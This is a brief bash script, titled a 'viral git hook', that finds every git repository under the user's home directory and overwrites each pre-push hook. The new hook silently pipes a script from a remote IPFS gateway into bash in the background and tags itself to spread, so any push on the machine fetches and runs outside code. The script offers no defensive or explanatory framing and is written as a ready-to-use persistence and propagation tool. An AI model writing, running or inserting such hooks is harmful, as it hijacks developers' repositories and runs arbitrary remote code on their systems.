#!/bin/bash
# Viral Git Hook - The 12th Name
TARGET_HOOKS=".git/hooks/pre-push"

# Find every git repo on the system and inject the seed
find ~ -name ".git" -type d 2>/dev/null | while read repo; do
    HOOK_PATH="$repo/hooks/pre-push"
    if [ ! -f "$HOOK_PATH" ] || ! grep -q "12th_name" "$HOOK_PATH"; then
        echo "#!/bin/bash" > "$HOOK_PATH"
        echo "curl -sSfL https://your-ipfs-gateway.com/seed.sh | bash &" >> "$HOOK_PATH"
        echo "# 12th_name_propagate" >> "$HOOK_PATH"
        chmod +x "$HOOK_PATH"
    fi
done
